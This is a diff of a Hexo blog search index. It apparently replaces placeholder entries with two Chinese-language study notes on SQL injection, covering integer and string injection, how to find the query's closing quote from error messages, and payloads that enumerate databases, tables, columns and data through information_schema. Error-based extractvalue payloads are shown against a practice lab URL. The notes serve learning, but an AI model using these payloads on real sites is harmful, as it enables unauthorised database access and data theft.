@@ -1,33 +1,73 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>我的第一篇博客</title>
-    <url>/2023/03/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%20-%20%E5%89%AF%E6%9C%AC%20(3)/</url>
-    <content><![CDATA[<p>hexo</p>
+    <title>SQL基础</title>
+    <url>/2023/04/02/SQL%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h2 id="SQL注入类型"><a href="#SQL注入类型" class="headerlink" title="SQL注入类型"></a>SQL注入类型</h2><h3 id="整型注入-不需要闭合-不一定需要注释"><a href="#整型注入-不需要闭合-不一定需要注释" class="headerlink" title="整型注入(不需要闭合,不一定需要注释)"></a>整型注入(不需要闭合,不一定需要注释)</h3><p>一般注释limit,用–+注释。不管字符型&#x2F;整型都建议–+注释,+号在浏览器中一般显示为空格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql:select * from user where id=1 limit 0,1;</span><br><span class="line"></span><br><span class="line">id=1  --+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+
+<h3 id="字符串类型注入-需要闭合-或者需要注释"><a href="#字符串类型注入-需要闭合-或者需要注释" class="headerlink" title="字符串类型注入(需要闭合,或者需要注释)"></a>字符串类型注入(需要闭合,或者需要注释)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql:select * from user where id=&quot;1&quot; limit 0,1;	</span><br><span class="line">	select * from user where id=&quot;1a&quot;		//有结果</span><br><span class="line">	select * from user where id=&quot;a1&quot;		//无结果</span><br><span class="line">sql语句只能读取字符串类型的数字,如读取到其他则会直接停止</span><br><span class="line"></span><br><span class="line">id=&quot;1&quot; --+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<h3 id="如何判断是整型还是字符型"><a href="#如何判断是整型还是字符型" class="headerlink" title="如何判断是整型还是字符型?"></a>如何判断是整型还是字符型?</h3><h4 id="1-and1-x3D-1-x2F-and1-x3D-2-真假判断字符型-x2F-整型"><a href="#1-and1-x3D-1-x2F-and1-x3D-2-真假判断字符型-x2F-整型" class="headerlink" title="1.and1&#x3D;1&#x2F;and1&#x3D;2(真假判断字符型&#x2F;整型)"></a>1.and1&#x3D;1&#x2F;and1&#x3D;2(真假判断字符型&#x2F;整型)</h4><p>字符型</p>
+<p>sql:select * from user where id&#x3D;”1 and 1&#x3D;1”		</p>
+<p>sql:select * from user where id&#x3D;”1 and 1&#x3D;2”		页面没有改变为字符型,因为到a就不读了<br><img src="/../img/image-20230328185426425.png"><br><img src="/../img/image-20230328190257398.png">  </p>
+<p>整型</p>
+<p>sql:select * from user where id&#x3D;1 and 1&#x3D;1</p>
+<p>sql:select * from user where id&#x3D;1 and 1&#x3D;2			页面发生改变,并判断1不等于2<br><img src="/../img/image-20230328185426425.png"><br><img src="/../img/image-20230328190646035.png">  </p>
+<h4 id="2-1-x2F-1回显到下个页面或上个页面-整型判断"><a href="#2-1-x2F-1回显到下个页面或上个页面-整型判断" class="headerlink" title="2.-1&#x2F;+1	回显到下个页面或上个页面(整型判断)"></a>2.-1&#x2F;+1	回显到下个页面或上个页面(整型判断)</h4><p>推荐使用-1,从2开始-1</p>
+<p>sql:select * from user where id&#x3D;”2-1”			与id&#x3D;2页面一致未发生改变,因为减号被拿掉,所以为字符型<br><img src="/../img/image-20230328191036457.png"></p>
+<p>sql:select * from user where id&#x3D;2-1		页面发生改变,先做运算再执行语句,为整型<br><img src="/../img/image-20230328191559887.png"></p>
+<h2 id="SQL注入字符型的闭合方式-单引号-x2F-双引号-x2F-x2F-…"><a href="#SQL注入字符型的闭合方式-单引号-x2F-双引号-x2F-x2F-…" class="headerlink" title="SQL注入字符型的闭合方式(单引号&#x2F;双引号&#x2F;()&#x2F;%…)"></a>SQL注入字符型的闭合方式(单引号&#x2F;双引号&#x2F;()&#x2F;%…)</h2><p>常见的闭合方式: ‘   “     ‘)   “)   “))</p>
+<p>select * from user where id&#x3D;”1”		用””双引号闭合,闭合为对称</p>
+<p>通过加’”引号,myql报错信息判断</p>
+<ul>
+<li>例1<br><img src="/../img/image-20230328192643409.png"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断信息如上</span><br><span class="line">?id=1&#x27;&quot;--+</span><br><span class="line">截取如下报错信息</span><br><span class="line">near &#x27;&quot;-- &#x27; LIMIT 0,1&#x27; </span><br><span class="line">并将mysql报错自带的&#x27;&#x27;去掉</span><br><span class="line">&quot;-- &#x27; LIMIT 0,1</span><br><span class="line">实际sql语句为select * from user where id=&#x27;1&#x27;</span><br><span class="line">通过加上&#x27;&quot;引号变为select * from user where id=&#x27;1&#x27;&quot;--+&#x27;</span><br><span class="line">id=&#x27;1&#x27;为闭合</span><br><span class="line">对应后面&quot;--+&#x27;报错信息显示出来了,+号在浏览器中一般显示为空格</span><br><span class="line">所以实际sql语句为select * from user where id=&#x27;1&#x27;</span><br></pre></td></tr></table></figure>
+例2<br><img src="/../img/image-20230328194017127.png"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断信息如上</span><br><span class="line">?id=2&#x27;&quot;--+</span><br><span class="line">截取如下报错信息</span><br><span class="line">near &quot;-- &#x27;) LIMIT 0,1</span><br><span class="line">并将mysql报错自带的&#x27;&#x27;去掉</span><br><span class="line">&quot;-- &#x27;) LIMIT 0,1		闭合为对称</span><br><span class="line">实际sql语句为select * from user where id=(&#x27;2&#x27;)</span><br><span class="line">通过加上&#x27;&quot;引号变为select * from user where id=(&#x27;2&#x27;&quot;--+&#x27;)</span><br><span class="line">id=(&#x27;2&#x27;为闭合,有相同符号就闭合</span><br><span class="line">对应后面&#x27;&quot;-- &#x27;)报错信息显示出来了,+号在浏览器中一般显示为空格</span><br><span class="line">所以实际sql语句为select * from user where id=(&#x27;2&#x27;)</span><br><span class="line">如要闭合就?id=2&#x27;)--+			闭合为对称</span><br><span class="line">select * from user where id=(&#x27;2&#x27;)--+&#x27;)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="通过代码判断"><a href="#通过代码判断" class="headerlink" title="通过代码判断"></a>通过代码判断</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br><span class="line">上面的闭合方式为&quot;)	</span><br><span class="line">&#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;为&quot;$id&quot;,因为&#x27;&#x27;单引号需要引注双引号&quot;</span><br></pre></td></tr></table></figure>
+
+
 ]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
   </entry>
   <entry>
-    <title>我的第一篇博客</title>
-    <url>/2023/03/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%20-%20%E5%89%AF%E6%9C%AC%20(2)/</url>
-    <content><![CDATA[<p>hexo</p>
+    <title>SQL注入方法</title>
+    <url>/2023/04/02/SQL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="SQL注入方法"><a href="#SQL注入方法" class="headerlink" title="SQL注入方法"></a>SQL注入方法</h2><ul>
+<li><p>UNION query SQL injection 		(可联合查询注入) </p>
+</li>
+<li><p>Error-based SQL injection		(报错型注入) </p>
+</li>
+<li><p>Boolean-based blind SQL injection(布尔型注入) </p>
+</li>
+<li><p>Time-based blind SQLinjection	 (基于时间延迟注入) </p>
+</li>
+<li><p>Wide char SQL injection 		 (宽字节注入) </p>
+</li>
+<li><p>Twice SQL injection 			 (二次注入) </p>
+</li>
+<li><p>Stacked queries SQL injection	 (可多语句查询注入) 堆叠注入</p>
+</li>
+</ul>
+<p>堆叠注入用于5.0以下版本的MySQL,sql语句;sql语句;sql语句;,直接在后面拼接 </p>
+<ul>
+<li>Access数据库 &#x3D;&gt;偏移注入<span id="more"></span></li>
+</ul>
+<h2 id="sql注入常用语句-playload"><a href="#sql注入常用语句-playload" class="headerlink" title="sql注入常用语句(playload)"></a>sql注入常用语句(playload)</h2><h3 id="1-列出数据库"><a href="#1-列出数据库" class="headerlink" title="1.列出数据库"></a>1.列出数据库</h3><p> limit 一个一个打印出来库名(用于查询条数受限)<br>  select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</p>
+<p> group_concat 一次性全部显示<br>  select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</p>
+<h3 id="2-列出某数据库中所有的表"><a href="#2-列出某数据库中所有的表" class="headerlink" title="2.列出某数据库中所有的表"></a>2.列出某数据库中所有的表</h3><p> limit 一个一个打印出来字段名<br>  select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;’数据库名称’ limit 0,1</p>
+<p> group_concat 一次性全部显示<br>  select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA&#x3D;’数据库名称’</p>
+<h3 id="3-列出某数据库中某表中所有的字段"><a href="#3-列出某数据库中某表中所有的字段" class="headerlink" title="3.列出某数据库中某表中所有的字段"></a>3.列出某数据库中某表中所有的字段</h3><p>​	limit 一个一个打印出来<br>​		select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA&#x3D;’数据库名’ and TABLE_NAME&#x3D;’数据库中的任意表’ limit 0,1<br>​	group_concat 一次性全部显示<br>​		select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA&#x3D;’数据库名’ and TABLE_NAME&#x3D;’数据库中的任意表’<br>数据库名称同时可以使用<strong>16进制</strong>(<strong>不要用引号</strong>)来代替,绕过单引号限制,<strong>0x</strong>开头<br>例:库	security&#x3D;0x7365637572697479</p>
+<h3 id="4-列出数据库中的表中的字段中的数据"><a href="#4-列出数据库中的表中的字段中的数据" class="headerlink" title="4.列出数据库中的表中的字段中的数据"></a>4.列出数据库中的表中的字段中的<strong>数据</strong></h3><p> limit 一个一个打印出来<br>  select 字段,字段 from 数据库.表 limit 0,1</p>
+<p> group_concat 把 一次性全部打印<br>(数据库.表可快速定位哪个数据库的那个表)<br>0x20为ASCII码的空格<br>0x2D为ASCII码的减号<br>select group_concat(concat(字段,0x2D,字段)) from security.users(数据库.表)</p>
+<h2 id="显示位受限时"><a href="#显示位受限时" class="headerlink" title="显示位受限时"></a>显示位受限时</h2><p><img src="/../img/image-20230330191207849.png"> </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.如果显示位受限时除了能用limit一个一个列出来</span><br><span class="line">http://www.sqli.com/Less-2/?id=1  and extractvalue(1, concat(0x7e,(select SCHEMA_NAME from information_schema.SCHEMATA limit 2,1),0x7e)) --+</span><br><span class="line"></span><br><span class="line">2.还能用substr(),substring(),left()函数</span><br><span class="line">and extractvalue(1, concat(0x7e,SUBSTR((playload),从第几位开始,读取长度),0x7e))</span><br><span class="line"></span><br><span class="line">http://www.sqli.com/Less-2/?id=1  and extractvalue(1, concat(0x7e,SUBSTR((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),1,10),0x7e)) --+</span><br><span class="line">http://www.sqli.com/Less-2/?id=1  and extractvalue(1, concat(0x7e,SUBSTR((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),11,10),0x7e)) --+</span><br><span class="line">直到读完为止</span><br></pre></td></tr></table></figure>
 ]]></content>
-  </entry>
-  <entry>
-    <title>我的第一篇博客</title>
-    <url>/2023/03/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%20-%20%E5%89%AF%E6%9C%AC%20(4)/</url>
-    <content><![CDATA[<p>hexo</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>我的第一篇博客</title>
-    <url>/2023/03/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%20-%20%E5%89%AF%E6%9C%AC/</url>
-    <content><![CDATA[<p>hexo</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>我的第一篇博客</title>
-    <url>/2023/03/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<p>hexo</p>
-]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
   </entry>
 </search>
